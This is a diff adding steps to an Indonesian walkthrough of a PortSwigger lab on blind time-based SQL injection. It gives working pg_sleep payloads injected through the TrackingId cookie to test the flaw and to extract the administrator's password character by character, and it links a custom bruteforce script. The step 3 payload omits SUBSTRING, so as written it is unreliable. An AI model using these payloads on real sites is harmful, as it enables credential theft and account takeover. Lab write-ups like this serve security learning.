@@ -39,6 +39,20 @@ Right-click the request and send it to **Repeater** (`Ctrl + R`).
 
 ---
 
+2. Cookie `TrackingId` adalah target kita, injeksi dengan `'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--` untuk mengecek apakah ada rentan atau tidak.
+Jika rentan respon akan delay 5 detik (bisa di liat di pojok kanan bawah).
+3. Setelah menunggu, injeksi dengan payload `'|| (SELECT CASE WHEN (password, 1, 1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--`
+Kita tidak mungkin bisa menebak *password* admin satu-persatu apalagi ada delay waktu. maka kita butuh tools **Bruteforce**, bisa pake **Burp Intruder** ataupun buatan sendiri.
+4. Di sini saya akan gunakan tools **[Bruteforce](https://github.com/noata5505/Portswigger-Lab-Burp-Community/blob/main/SQL-Injection/Tools/15_Bruteforce_Tool.py)** buatan sendiri. Cara menggunakannya:
+- Jalankan tools
+- Input **URL** ```https://(YOUR-ID).web-security-academy.net/```
+- Input **cookie_payload** ``` (YOUR-COOKIE)'|| (SELECT CASE WHEN SUBSTRING(password, {i}, 1)='{char}' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--```
+- Tunggu (bisa sambil ngopi karena ada time-dealy)
+- Selesai.
+5. Copy hasilnya dan login dengan kredensial *administrator*
+6. Selesai. Banner **LAB SOLVE** akan muncul.
+<img width="1917" height="911" alt="Screenshot 2026-09-28 024528" src="https://github.com/user-attachments/assets/3782ef76-aa7e-48d3-a4b2-065fba773647" />
+
 
 
 ---
